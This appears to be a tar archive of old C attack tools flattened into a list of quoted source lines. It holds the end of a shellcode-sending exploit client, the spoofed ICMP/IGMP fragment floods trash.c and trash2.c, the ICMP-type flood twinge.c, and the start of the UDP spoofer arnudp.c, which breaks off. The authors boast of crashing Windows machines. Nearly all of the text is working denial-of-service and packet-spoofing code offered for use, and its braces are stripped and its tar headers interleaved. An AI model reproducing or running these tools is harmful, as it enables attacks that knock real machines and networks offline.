            "\t\t} else {",
            "\t\t\t*pfft = *cc + 0x21;",
            "\t\t\tpfft++;",
            "\t\tcc++;",
            "\t\tm += 1;",
            "\tprintf (\"Host: %s Port: %d Url: %s\\n\", host, port, url);",
            "\tprintf (\"Connecting... \");",
            "\tfflush (stdout);",
            "\tsd = net_connect (&cs, host, port, NULL, 0, 30);  ",
            "\tif (sd < 1) {",
            "\t\tprintf (\"failed!\\n\");",
            "\t\texit (EXIT_FAILURE);",
            "\tprintf (\"done.. sending shellcode..\");",
            "\tfflush (stdout);",
            "\tnet_write (sd, \"%s\\n\\n\", front);",
            "\tprintf (\"done.. closing fd!\\n\");",
            "\tclose (sd);",
            "\tprintf (\"%s\\n\", front);",
            "\texit (EXIT_SUCCESS);",
            "net_connect (struct sockaddr_in *cs, char *server, unsigned short int port, char *sourceip,",
            "                unsigned short int sourceport, int sec)",
            "        int             n, len, error, flags;",
            "        int             fd;",
            "        struct timeval  tv;",
            "        fd_set          rset, wset;",
            "        /* first allocate a socket */",
            "        cs->sin_family = AF_INET;",
            "        cs->sin_port = htons (port);",
            "        fd = socket (cs->sin_family, SOCK_STREAM, 0);",
            "        if (fd == -1)",
            "                return (-1);",
            "        if (!(cs->sin_addr.s_addr = net_resolve (server))) {",
            "                close (fd);",
            "                return (-1);",
            "        }",
            "        flags = fcntl (fd, F_GETFL, 0);",
            "        if (flags == -1) {",
            "                close (fd);",
            "                return (-1);",
            "        }",
            "        n = fcntl (fd, F_SETFL, flags | O_NONBLOCK);",
            "        if (n == -1) {",
            "                close (fd);",
            "                return (-1);",
            "        }",
            "        error = 0;",
            "        n = connect (fd, (struct sockaddr *) cs, sizeof (struct sockaddr_in));",
            "        if (n < 0) {",
            "                if (errno != EINPROGRESS) {",
            "                        close (fd);",
            "                        return (-1);",
            "                }",
            "        }",
            "        if (n == 0)",
            "                goto done;",
            "        FD_ZERO(&rset);",
            "        FD_ZERO(&wset);",
            "        FD_SET(fd, &rset);",
            "        FD_SET(fd, &wset);",
            "        tv.tv_sec = sec;",
            "        tv.tv_usec = 0;",
            "        n = select(fd + 1, &rset, &wset, NULL, &tv);",
            "        if (n == 0) {",
            "                close(fd);",
            "                errno = ETIMEDOUT;",
            "                return (-1);",
            "        }",
            "        if (n == -1)",
            "                return (-1);",
            "        if (FD_ISSET(fd, &rset) || FD_ISSET(fd, &wset)) {",
            "                if (FD_ISSET(fd, &rset) && FD_ISSET(fd, &wset)) {",
            "                        len = sizeof(error);",
            "                        if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {",
            "                                errno = ETIMEDOUT;",
            "                                return (-1);",
            "                        }",
            "                        if (error == 0) {",
            "                                goto done;",
            "                        } else {",
            "                                errno = error;",
            "                                return (-1);",
            "                        }",
            "                }",
            "        } else",
            "                return (-1);",
            "done:",
            "        n = fcntl(fd, F_SETFL, flags);",
            "        if (n == -1)",
            "                return (-1);",
            "        return (fd);",
            "unsigned long int",
            "net_resolve (char *host)",
            "        long            i;",
            "        struct hostent  *he;",
            "        i = inet_addr(host);",
            "        if (i == -1) {",
            "                he = gethostbyname(host);",
            "                if (he == NULL) {",
            "                        return (0);",
            "                } else {",
            "                        return (*(unsigned long *) he->h_addr);",
            "                }",
            "        }",
            "        return (i);",
            "void",
            "net_write (int fd, const char *str, ...)",
            "        char    tmp[8192];",
            "        va_list vl;",
            "        int     i;",
            "        va_start(vl, str);",
            "        memset(tmp, 0, sizeof(tmp));",
            "        i = vsnprintf(tmp, sizeof(tmp), str, vl);",
            "        va_end(vl);",
            "        send(fd, tmp, i, 0);",
            "        return;",
            "datapool/src/trash2.c",
            "0100644",
            "0000000",
            "0000000",
            "00000023635",
            "07100656457",
            "013541",
            "ustar  ",
            "root",
            "root",
            "/* Complex denial of service attack against Windows98/95/2000/NT Machines",
            "   Overview: sends random, spoofed, ICMP/IGMP packets with random spoof source",
            "   Result: Freezes the users machine or a CPU usage will rise to extreme",
            "   lag. tested on:",
            "        2.0.35",
            "        2.2.5-15",
            "        2.2.9",
            "        2.0.36",
            "  From a 56k I killed 2/5 Win/NT Box's, 5/5 Win98, 4/6 Win95.",
            "  And those who didn't die, they where lagged to hell...",
            "  You may freely alter this code, but give credit where credit is due ",
            "\tgcc -o trash2 trash2.c will do fine...",
            "\te-mail leet@ibw.com.ni for any questions. ",
            "/* greets go out to:",
            "\t    bombfirst, L^Warrior, codesearc, Asphyx, killtron, ^S|lver, randip(); fucntion stolen from kox.c",
            "        acidspill, glock24, p0larbear, xjust, bxj2k, JUSTaGIRL [you know who you are]",
            "        Drth_Maul,everyone in #bitchx@unet, #outlaw@unet, #slackware@unet, #kernel@unet",
            "                                   [outlaw]",
            "        ",
            "#include <stdio.h>",
            "#include <unistd.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <sys/socket.h>",
            "#include <pwd.h>",
            "#include <time.h>",
            "#include <sys/utsname.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/ip_icmp.h>",
            "#include <netinet/igmp.h>",
            "void banner(void) {",
            "        ",
            "   printf(\"trash2.c - misteri0@unet [outlaw]\\n\\n\");",
            "   printf(\"\\n\\n\");",
            "void usage(const char *progname) {",
            "   printf(\"usage:\\n\");",
            "   printf(\"./trash  [dst_ip] [# of packets]\\n\",progname);",
            "   printf(\"\\t[*] [ip_dst] :  ex: 201.12.3.76\\n\");",
            "   printf(\"\\t[*] [number]  : 100\\n\");",
            "   printf(\"\\t-----------------------------------------\\n\");",
            "unsigned int randip()",
            "        struct hostent *he;",
            "        struct sockaddr_in sin;",
            "        char *buf = (char *)calloc(1, sizeof(char) * 16);",
            "        sprintf(buf, \"%d.%d.%d.%d\",",
            "                (random()%191)+23,",
            "                (random()%253)+1,",
            "                (random()%253)+1,",
            "                (random()%253)+1); ",
            "        inet_aton(buf, (struct in_addr *)&sin);",
            "        return sin.sin_addr.s_addr;",
            "int resolve( const char *name, unsigned int port, struct sockaddr_in *addr ) {",
            "   struct hostent *host;",
            "   memset(addr,0,sizeof(struct sockaddr_in));",
            "   addr->sin_family = AF_INET;",
            "   addr->sin_addr.s_addr = inet_addr(name);",
            "   if (addr->sin_addr.s_addr == -1) {",
            "      if (( host = gethostbyname(name) ) == NULL )  {",
            "         fprintf(stderr,\"ERROR: Unable to resolve host %s\\n\",name);",
            "         return(-1);",
            "      }",
            "      addr->sin_family = host->h_addrtype;",
            "      memcpy((caddr_t)&addr->sin_addr,host->h_addr,host->h_length);",
            "   }",
            "   addr->sin_port = htons(port);",
            "   return(0);",
            "unsigned short in_cksum(addr, len)",
            "    u_short *addr;",
            "    int len;",
            "    register int nleft = len;",
            "    register u_short *w = addr;",
            "    register int sum = 0;",
            "    u_short answer = 0;",
            "    while (nleft > 1)  {",
            "        sum += *w++;",
            "        nleft -= 2;",
            "    }",
            "    if (nleft == 1) {",
            "        *(u_char *)(&answer) = *(u_char *)w ;",
            "        sum += answer;",
            "    }",
            "    sum = (sum >> 16) + (sum & 0xffff);",
            "    sum += (sum >> 16);                 ",
            "    answer = ~sum;                      ",
            "    return(answer);",
            "int sendwin98bug(struct sockaddr_in *victim, unsigned long spoof)",
            "        int BIGIGMP = 1500;",
            "        unsigned char *pkt;",
            "        struct iphdr *ip;",
            "        struct igmphdr *igmp;",
            "        struct utsname *un;",
            "        struct passwd *p;",
            "        int i, s;",
            "        int id = (random() % 40000) + 500;",
            "        pkt = (unsigned char *)calloc(1, BIGIGMP);",
            "        ip = (struct iphdr *)pkt;",
            "        igmp = (struct igmphdr *)(pkt + sizeof(struct iphdr));",
            "        ip->version = 4;",
            "        ip->ihl = (sizeof *ip) / 4;",
            "        ip->ttl = 255;",
            "        ip->tot_len = htons(BIGIGMP);",
            "        ip->protocol = IPPROTO_IGMP;",
            "        ip->id = htons(id);",
            "        ip->frag_off = htons(IP_MF);",
            "        ip->saddr = spoof;",
            "        ip->daddr = victim->sin_addr.s_addr;",
            "        ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));",
            "        igmp->type = 0;",
            "        igmp->group = 0;",
            "        igmp->csum = in_cksum((unsigned short *)igmp, sizeof(struct igmphdr));",
            "        for(i = sizeof(struct iphdr) + sizeof(struct igmphdr) + 1;",
            "            i < BIGIGMP; i++)",
            "                pkt[i] = random() % 255;",
            "#ifndef I_GROK",
            "        un = (struct utsname *)(pkt + sizeof(struct iphdr) +",
            "              sizeof(struct igmphdr) + 40);",
            "        uname(un);",
            "        p = (struct passwd *)((void *)un + sizeof(struct utsname) + 10);",
            "        memcpy(p, getpwuid(getuid()), sizeof(struct passwd));",
            "#endif",
            "        if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {",
            "                perror(\"error: socket()\");",
            "                return 1;",
            "        }",
            "        if(sendto(s, pkt, BIGIGMP, 0, victim,",
            "           sizeof(struct sockaddr_in)) == -1) { ",
            "                perror(\"error: sendto()\");",
            "                return 1;",
            "        }",
            "        for(i = 1; i < 5; i++) {",
            "                if(i > 3)",
            "                        ip->frag_off = htons(((BIGIGMP-20) * i) >> 3);",
            "                else",
            "                        ip->frag_off = htons(((BIGIGMP-20) * i) >> 3 | IP_MF);",
            "                sendto(s, pkt, BIGIGMP, 0, victim, sizeof(struct sockaddr_in));",
            "        }",
            "        free(pkt);",
            "        close(s);",
            "        return 0;",
            "int send_winbomb(int socket,",
            "                 unsigned long spoof_addr,",
            "                 struct sockaddr_in *dest_addr) {",
            "   unsigned char  *packet;",
            "   struct iphdr   *ip;",
            "   struct icmphdr *icmp;",
            "   int rc;",
            "   packet = (unsigned char *)malloc(sizeof(struct iphdr) +",
            "                                    sizeof(struct icmphdr) + 8);",
            "   ip = (struct iphdr *)packet;",
            "   icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));",
            "   memset(ip,0,sizeof(struct iphdr) + sizeof(struct icmphdr) + 8);",
            "   ip->ihl      = 5;",
            "   ip->version  = 4;",
            "// ip->tos      = 2;",
            "   ip->id       = htons(1234);",
            "   ip->frag_off |= htons(0x2000);",
            "// ip->tot_len  = 0;",
            "   ip->ttl      = 30;",
            "   ip->protocol = IPPROTO_ICMP;",
            "   ip->saddr    = spoof_addr;",
            "   ip->daddr    = dest_addr->sin_addr.s_addr;",
            "   ip->check    = in_cksum(ip, sizeof(struct iphdr));",
            "   icmp->type              = rand() % 15;",
            "   icmp->code              = rand() % 15;",
            "   icmp->checksum          = in_cksum(icmp,sizeof(struct icmphdr) + 1);",
            "   if (sendto(socket,",
            "              packet,",
            "              sizeof(struct iphdr) +",
            "              sizeof(struct icmphdr) + 1,0,",
            "              (struct sockaddr *)dest_addr,",
            "              sizeof(struct sockaddr)) == -1) { return(-1); }",
            "   ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + 8);",
            "   ip->frag_off = htons(8 >> 3);",
            "   ip->frag_off |= htons(0x2000);",
            "   ip->check    = in_cksum(ip, sizeof(struct iphdr));",
            "   icmp->type = rand() % 15;",
            "   icmp->code = rand() % 15;",
            "   icmp->checksum = 0;",
            "   if (sendto(socket,",
            "              packet,",
            "              sizeof(struct iphdr) +",
            "              sizeof(struct icmphdr) + 8,0,",
            "              (struct sockaddr *)dest_addr,",
            "              sizeof(struct sockaddr)) == -1) { return(-1); }",
            "   free(packet);",
            "   return(0);",
            "int send_igmp(int socket,",
            "                 unsigned long spoof_addr,",
            "                 struct sockaddr_in *dest_addr) {",
            "   unsigned char  *packet;",
            "   struct iphdr   *ip;",
            "   struct igmphdr *igmp;",
            "   int rc;",
            "         ",
            "       ",
            "   packet = (unsigned char *)malloc(sizeof(struct iphdr) +",
            "                                    sizeof(struct igmphdr) + 8);   ",
            "    ",
            "   ip = (struct iphdr *)packet;",
            "   igmp = (struct igmphdr *)(packet + sizeof(struct iphdr));",
            "   memset(ip,0,sizeof(struct iphdr) + sizeof(struct igmphdr) + 8);",
            "   ip->ihl      = 5;",
            "   ip->version  = 4;",
            "   ip->id       = htons(34717);",
            "   ip->frag_off = htons(0x2000);",
            "   ip->ttl      = 255;",
            "   ip->protocol = IPPROTO_IGMP;",
            "   ip->saddr    = spoof_addr;  ",
            "   ip->daddr    = dest_addr->sin_addr.s_addr;",
            "   ip->check    = in_cksum(ip, sizeof(struct iphdr));",
            "    ",
            "   igmp->type              = 8;",
            "   igmp->code              = 0;",
            "     ",
            "   if (sendto(socket,",
            "              packet,",
            "              sizeof(struct iphdr) +",
            "              sizeof(struct igmphdr) + 1,0,",
            "              (struct sockaddr *)dest_addr,",
            "              sizeof(struct sockaddr)) == -1) { return(-1); }",
            "    ",
            "   ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct igmphdr) + 8);",
            "   ip->frag_off = htons(8 >> 3);",
            "   ip->version  = 4;",
            "   ip->id       = htons(34717);",
            "   ip->frag_off |= htons(0x2000);",
            "   ip->ttl      = 255;",
            "   ip->protocol = IPPROTO_IGMP;",
            "   ip->saddr    = spoof_addr;",
            "   ip->daddr    = dest_addr->sin_addr.s_addr;",
            "   ip->check    = in_cksum(ip, sizeof(struct iphdr));",
            "   igmp->type              = 8;",
            "   igmp->code              = 0;",
            "         ",
            "   if (sendto(socket,",
            "              packet,",
            "              sizeof(struct iphdr) +",
            "              sizeof(struct igmphdr) + 1,0,",
            "              (struct sockaddr *)dest_addr,",
            "              sizeof(struct sockaddr)) == -1) { return(-1); }",
            "   ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct igmphdr) + 8);",
            "   ip->frag_off = htons(8 >> 3);",
            "   ip->frag_off |= htons(0x2000);",
            "   ip->check    = in_cksum(ip, sizeof(struct iphdr));",
            "   igmp->type = 0;",
            "   igmp->code = 0;",
            "   if (sendto(socket,",
            "              packet,",
            "              sizeof(struct iphdr) +",
            "              sizeof(struct igmphdr) + 8,0,",
            "              (struct sockaddr *)dest_addr,",
            "              sizeof(struct sockaddr)) == -1) { return(-1); }",
            "     ",
            "   free(packet);",
            "   return(0);",
            "              ",
            "int main(int argc, char **argv) {",
            "   struct sockaddr_in dest_addr;",
            "   unsigned int i,sock;",
            "   unsigned long src_addr;",
            "   banner();",
            "   if ((argc != 3)) {",
            "      usage(argv[0]);",
            "      return(-1);",
            "   }",
            "   if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {",
            "      fprintf(stderr,\"ERROR: Opening raw socket.\\n\");",
            "      return(-1);",
            "   }",
            "  /*  if (resolve(argv[1],0,&dest_addr) == -1) { return(-1); } */",
            "   src_addr = dest_addr.sin_addr.s_addr;",
            "   if (resolve(argv[1],0,&dest_addr) == -1) { return(-1); }",
            "   printf(\"Status: Connected....packets sent.\\n\",argv[0]);",
            "   for (i = 0;i < atoi(argv[2]);i++) {",
            "      if (send_winbomb(sock,randip(),&dest_addr) == -1 || send_igmp(sock,randip(),&dest_addr) == -1 || sendwin98bug(&dest_addr, randip()) ) {",
            "         fprintf(stderr,\"ERROR: Unable to Connect To host.\\n\");",
            "         return(-1);",
            "      }",
            "   }",
            "datapool/src/trash.c",
            "0100644",
            "0000000",
            "0000000",
            "00000011653",
            "07100656437",
            "013452",
            "ustar  ",
            "root",
            "root",
            "/* Simple denial of service attack against Windows98/95/2000/NT Machines",
            "   Overview: sends random, spoofed, ICMP packets with randomly choosen",
            "   ICMP error codes.",
            "   Result: Freezes the users machine or a CPU usage will rise to extreme",
            "   lag. tested on:",
            "        2.0.35",
            "        2.2.5-15",
            "        2.2.9",
            "        2.0.36",
            "  You may freely alter this code, but give credit where credit is due ",
            "/* greets go out to:",
            "        |gyr0|, Legio2000 Security Research(c)[for the idea and some of",
            "        the code from bloop.c], codesearc, P.A.T.C.H., ppl in",
            "        #ehforce@unet,  #bitchx@unet, 0l3g, packetstorm security",
            "                -coded by misteri0 - [pr0tocol]",
            "        ",
            "#include <stdio.h>",
            "#include <unistd.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <sys/socket.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/ip_icmp.h>",
            "void banner(void) {",
            "        ",
            "   printf(\"trash.c - misteri0@unet [pr0tocol]\\n\\n\");",
            "   printf(\"\\n\\n\");",
            "void usage(const char *progname) {",
            "   printf(\"usage:\\n\");",
            "   printf(\"./trash [src_ip] [dst_ip] [# of packets]\\n\",progname);",
            "   printf(\"\\t[*] [ip_src] :  ex: 205.56.78.0\\n\");",
            "   printf(\"\\t[*] [ip_dst] :  ex: 201.12.3.76\\n\");",
            "   printf(\"\\t[*] [number]  : 100\\n\");",
            "   printf(\"[pr0tocol] We are all connected by a simple line, just have to know where to cut it [pr0tocol]\\n\");",
            "int resolve( const char *name, unsigned int port, struct sockaddr_in *addr ) {",
            "   struct hostent *host;",
            "   memset(addr,0,sizeof(struct sockaddr_in));",
            "   addr->sin_family = AF_INET;",
            "   addr->sin_addr.s_addr = inet_addr(name);",
            "   if (addr->sin_addr.s_addr == -1) {",
            "      if (( host = gethostbyname(name) ) == NULL )  {",
            "         fprintf(stderr,\"ERROR: Unable to resolve host %s\\n\",name);",
            "         return(-1);",
            "      }",
            "      addr->sin_family = host->h_addrtype;",
            "      memcpy((caddr_t)&addr->sin_addr,host->h_addr,host->h_length);",
            "   }",
            "   addr->sin_port = htons(port);",
            "   return(0);",
            "unsigned short in_cksum(addr, len)",
            "    u_short *addr;",
            "    int len;",
            "    register int nleft = len;",
            "    register u_short *w = addr;",
            "    register int sum = 0;",
            "    u_short answer = 0;",
            "    while (nleft > 1)  {",
            "        sum += *w++;",
            "        nleft -= 2;",
            "    }",
            "    if (nleft == 1) {",
            "        *(u_char *)(&answer) = *(u_char *)w ;",
            "        sum += answer;",
            "    }",
            "    sum = (sum >> 16) + (sum & 0xffff);",
            "    sum += (sum >> 16);                 ",
            "    answer = ~sum;                      ",
            "    return(answer);",
            "int send_winbomb(int socket,",
            "                 unsigned long spoof_addr,",
            "                 struct sockaddr_in *dest_addr) {",
            "   unsigned char  *packet;",
            "   struct iphdr   *ip;",
            "   struct icmphdr *icmp;",
            "   int rc;",
            "   packet = (unsigned char *)malloc(sizeof(struct iphdr) +",
            "                                    sizeof(struct icmphdr) + 8);",
            "   ip = (struct iphdr *)packet;",
            "   icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));",
            "   memset(ip,0,sizeof(struct iphdr) + sizeof(struct icmphdr) + 8);",
            "   ip->ihl      = 5;",
            "   ip->version  = 4;",
            "// ip->tos      = 2;",
            "   ip->id       = htons(1234);",
            "   ip->frag_off |= htons(0x2000);",
            "// ip->tot_len  = 0;",
            "   ip->ttl      = 30;",
            "   ip->protocol = IPPROTO_ICMP;",
            "   ip->saddr    = spoof_addr;",
            "   ip->daddr    = dest_addr->sin_addr.s_addr;",
            "   ip->check    = in_cksum(ip, sizeof(struct iphdr));",
            "   icmp->type              = rand() % 15;",
            "   icmp->code              = rand() % 15;",
            "   icmp->checksum          = in_cksum(icmp,sizeof(struct icmphdr) + 1);",
            "   if (sendto(socket,",
            "              packet,",
            "              sizeof(struct iphdr) +",
            "              sizeof(struct icmphdr) + 1,0,",
            "              (struct sockaddr *)dest_addr,",
            "              sizeof(struct sockaddr)) == -1) { return(-1); }",
            "   ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + 8);",
            "   ip->frag_off = htons(8 >> 3);",
            "   ip->frag_off |= htons(0x2000);",
            "   ip->check    = in_cksum(ip, sizeof(struct iphdr));",
            "   icmp->type = rand() % 15;",
            "   icmp->code = rand() % 15;",
            "   icmp->checksum = 0;",
            "   if (sendto(socket,",
            "              packet,",
            "              sizeof(struct iphdr) +",
            "              sizeof(struct icmphdr) + 8,0,",
            "              (struct sockaddr *)dest_addr,",
            "              sizeof(struct sockaddr)) == -1) { return(-1); }",
            "   free(packet);",
            "   return(0);",
            "int main(int argc, char * *argv) {",
            "   struct sockaddr_in dest_addr;",
            "   unsigned int i,sock;",
            "   unsigned long src_addr;",
            "   banner();",
            "   if ((argc != 4)) {",
            "      usage(argv[0]);",
            "      return(-1);",
            "   }",
            "   if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {",
            "      fprintf(stderr,\"ERROR: Opening raw socket.\\n\");",
            "      return(-1);",
            "   }",
            "   if (resolve(argv[1],0,&dest_addr) == -1) { return(-1); }",
            "   src_addr = dest_addr.sin_addr.s_addr;",
            "   if (resolve(argv[2],0,&dest_addr) == -1) { return(-1); }",
            "   printf(\"Status: Connected....packets sent.\\n\",argv[0]);",
            "   for (i = 0;i < atoi(argv[3]);i++) {",
            "      if (send_winbomb(sock,",
            "                       src_addr,",
            "                       &dest_addr) == -1) {",
            "         fprintf(stderr,\"ERROR: Unable to Connect To luser.\\n\");",
            "         return(-1);",
            "      }",
            "   }",
            "datapool/src/twinge.c",
            "0100644",
            "0000000",
            "0000000",
            "00000012233",
            "07065770625",
            "013627",
            "ustar  ",
            "root",
            "root",
            "/*Hi Everyone.",
            "I've had this sitting on my hard drive for awhile but it still works, so I figured it was time to see this get fixed. Crashes almost any windows box on your local network. Compiles on Linux. If you can't figure it out you shouldn't be using it anyways. =)",
            "-sinkhole",
            "-- BEGIN twinge.c --*/",
            "  twinge.c - by sinkhole@dos.org [6/99]",
            "  this cycle through all the possible icmp types and subtypes and",
            "  send to target host, 1 cycle == 1 run thru all of em",
            "  Crashes almost all Windows boxes over a LAN.",
            "  DISCLAIMER:",
            "  This is a PoC (Proof Of Concept) program for educational purposes",
            "  only. Using this program on public networks where other people",
            "  are affected by your actions is _HIGHLY ILLEGAL_ and is not what",
            "  this is made for.",
            "  for without help from ryan this wouldnt have been coded. =)",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <sys/socket.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/ip_icmp.h>",
            "long counter=1;",
            "void usage(const char *progname, const char *user) {",
            "   fprintf(stderr, \"twinge.c by sinkhole@dos.org - licensed for use by %s\\n\", user);",
            "   fprintf(stderr, \"This is a PoC (Proof of Concept) program for educational uses.\\n\");",
            "   fprintf(stderr, \"usage: %s <dest> <cycles [0 == continuous]>\\n\", progname);",
            "int resolver(const char *name, unsigned int port, struct sockaddr_in *addr ) {",
            "   struct hostent *host;",
            "   memset(addr,0,sizeof(struct sockaddr_in));",
            "   addr->sin_family = AF_INET;",
            "   addr->sin_addr.s_addr = inet_addr(name);",
            "   if (addr->sin_addr.s_addr == -1) {",
            "      if (( host = gethostbyname(name) ) == NULL )  {",
            "         fprintf(stderr,\"ERROR: Unable to resolve host %s\\n\",name);",
            "         return(-1);",
            "      }",
            "      addr->sin_family = host->h_addrtype;",
            "      memcpy((caddr_t)&addr->sin_addr,host->h_addr,host->h_length);",
            "   }",
            "   addr->sin_port = htons(port);",
            "   return(0);",
            "unsigned short in_cksum(addr, len) /* normal checksum */",
            "u_short *addr;",
            "int len;",
            "   register int nleft = len;",
            "   register u_short *w = addr;",
            "   register int sum = 0;",
            "   u_short answer = 0;",
            "   while (nleft > 1)  {",
            "      sum += *w++;",
            "      nleft -= 2;",
            "   }",
            "   if (nleft == 1) {",
            "      *(u_char *)(&answer) = *(u_char *)w;",
            "      sum += answer;",
            "   }",
            "   sum = (sum >> 16) + (sum & 0xffff);",
            "   sum += (sum >> 16);",
            "   answer = ~sum;",
            "   return(answer);",
            "int send_packet(int socket,",
            "\t\tunsigned long spoof_addr,",
            "\t\tstruct sockaddr_in *dest_addr, long seq, int ty, int code) {",
            "   unsigned char  *packet;",
            "   struct iphdr   *ip;",
            "   struct icmphdr *icmp;",
            "   int rc;",
            "   #ifdef DEBUG",
            "      printf(\"type: %d code: %d\\n\", ty, code);",
            "   #endif",
            "   srandom((getpid()+time(NULL)+seq));",
            "   packet = (unsigned char *)malloc(sizeof(struct iphdr) +",
            "                                    sizeof(struct icmphdr) + 8);",
            "   ip = (struct iphdr *)packet;",
            "   icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));",
            "   memset(ip,0,sizeof(struct iphdr) + sizeof(struct icmphdr) + 8);",
            "   ip->ihl      = 5;",
            "   ip->version  = 4;",
            "   ip->id       = htons(random()*(seq*getpid()*3));",
            "   ip->frag_off = 0;",
            "   ip->tot_len  = strlen(packet);",
            "   ip->ttl      = 255;",
            "   ip->protocol = IPPROTO_ICMP;",
            "   ip->saddr    = random()+ty+getpid();",
            "   ip->daddr    = dest_addr->sin_addr.s_addr;",
            "   ip->check    = in_cksum(ip, sizeof(struct iphdr));",
            "   icmp->type              = ty;",
            "   icmp->code              = code;",
            "   /*",
            "    3(unreach): cycle 0-9",
            "    5(redirect): cycle 0-3",
            "    11(time_exceed): cycle 0-1",
            "   */",
            "   icmp->checksum          = in_cksum(icmp,sizeof(struct icmphdr) + 1);",
            "   if (sendto(socket,",
            "              packet,",
            "              sizeof(struct iphdr) +",
            "              sizeof(struct icmphdr) + 1,0,",
            "              (struct sockaddr *)dest_addr,",
            "              sizeof(struct sockaddr)) == -1) {",
            "      perror(\"sendto\");",
            "      exit(0);",
            "   }",
            "   free(packet);",
            "   return(0);",
            "int main(int argc, char *argv[]) {",
            "   struct sockaddr_in dest_addr;",
            "   unsigned int i, x, s, sock;",
            "   unsigned long src_addr;",
            "   char owner[10];",
            "   strcpy(owner, \"t\");",
            "   strcat(owner, \"h\");",
            "   strcat(owner, \"e\");",
            "   strcat(owner, \" \");",
            "   strcat(owner, \"p\");",
            "   strcat(owner, \"u\");",
            "   strcat(owner, \"b\");",
            "   strcat(owner, \"l\");",
            "   strcat(owner, \"i\");",
            "   strcat(owner, \"c\");",
            "   if(argc < 2) {",
            "      usage(argv[0], owner);",
            "      exit(0);",
            "   }",
            "  if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {",
            "      fprintf(stderr,\"ERROR: Opening raw socket. (need UID 0)\\n\");",
            "      return(-1);",
            "   }",
            "   if (resolver(argv[1],0,&dest_addr) == -1) {",
            "\tfprintf(stderr, \"Cannot resolve destination\\n\");",
            "\texit(0);",
            "   }",
            "   src_addr = dest_addr.sin_addr.s_addr;",
            "   for (s = 0;s <= atoi(argv[2]) || (atoi(argv[2]) == 0);s++) {",
            "      for (i = 0;i < 18;i++) {",
            "\t switch(i) {",
            "\t  case 3:",
            "\t    /* cycle 0-9 */",
            "\t    for (x=0; x<=9; ++x) send_packet(sock, src_addr, &dest_addr, counter, i, x);",
            "\t    break;",
            "\t  case 5:",
            "\t    /* cycle 0-3 */",
            "\t    for (x=0; x<=3; ++x) send_packet(sock, src_addr, &dest_addr, counter, i, x);",
            "\t    break;",
            "\t  case 11:",
            "\t    /* cycle 0-1 */",
            "\t    for(x=0;x<=1;++x) send_packet(sock, src_addr, &dest_addr, counter, i, x);",
            "\t    break;",
            "\t  default:",
            "\t    /* just use 0 =) */",
            "\t    send_packet(sock, src_addr, &dest_addr,  counter, i, 0);",
            "\t ++counter;",
            "      }",
            "   }",
            "/*-- END twinge.c --",
            "datapool/src/udpdata.c",
            "0100644",
            "0000000",
            "0000000",
            "00000012033",
            "07051164074",
            "013740",
            "ustar  ",
            "root",
            "root",
            "From B.O.S. 2/05/96",
            "I noticed someone mentioning the echo port. My advice is to disable the ",
            "echo service completely. It is often used by hackers to hang a computer.",
            "Try sending a packet from port 7 your ip to port 7 your ip.",
            "The system will bounce the packet back and forth slowing the system ",
            "drastically.",
            "A Hacker Program I have seen used to do this is called arnudp.c ",
            "/************************************************************************/",
            "/* arnudp.c version 0.01 by Arny - cs6171@scitsc.wlv.ac.uk\t\t*/",
            "/* Sends a single udp datagram with the source/destination address/port\t*/",
            "/* set to whatever you want.  Unfortunately Linux 1.2 and SunOS 4.1\t*/",
            "/* don't seem to have the IP_HDRINCL option, so the source address will\t*/",
            "/* be set to the real address.  It does however work ok on SunOS 5.4.\t*/",
            "/* Should compile fine with just an ANSI compiler (such as gcc) under\t*/",
            "/* Linux and SunOS 4.1, but with SunOS 5.4 you have to specify extra\t*/",
            "/* libraries on the command line:\t\t\t\t\t*/",
            "/* \t/usr/ucb/cc -o arnudp arnudp001.c -lsocket -lnsl\t\t*/",
            "/* I'll state the obvious - this needs to be run as root!  Do not use\t*/",
            "/* this program unless you know what you are doing, as it is possible\t*/",
            "/* that you could confuse parts of your network\t/ internet.\t\t*/",
            "/* (c) 1995 Arny - I accept no responsiblity for anything this does.\t*/",
            "/************************************************************************/",
            "/* I used the source of traceroute as an example while writing this.\t*/",
            "/* Many thanks to Dan Egnor (egnor@ugcs.caltech.edu) and Rich Stevens\t*/",
            "/* for pointing me in the right direction.\t\t\t\t*/",
            "/************************************************************************/",
            "#include<sys/types.h>",
            "#include<sys/socket.h>",
            "#include<netinet/in_systm.h>",
            "#include<netinet/in.h>",
            "#include<netinet/ip.h>",
            "#include<netinet/udp.h>",
            "#include<errno.h>",
            "#include<string.h>",
            "#include<netdb.h>",
            "#include<arpa/inet.h>",
            "#include<stdio.h>",
            "struct sockaddr sa;",
            "main(int argc,char **argv)",
            "int fd;",
            "int x=1;",
            "struct sockaddr_in *p;",
            "struct hostent *he;",
            "u_char gram[38]=",
            "\t0x45,\t0x00,\t0x00,\t0x26,",
            "\t0x12,\t0x34,\t0x00,\t0x00,",
            "\t0xFF,\t0x11,\t0,\t0,",
            "\t0,\t0,\t0,\t0,",
            "\t0,\t0,\t0,\t0,",
            "\t0,\t0,\t0,\t0,",
            "\t0x00,\t0x12,\t0x00,\t0x00,",
            "\t'1','2','3','4','5','6','7','8','9','0'",
            "if(argc!=5)",
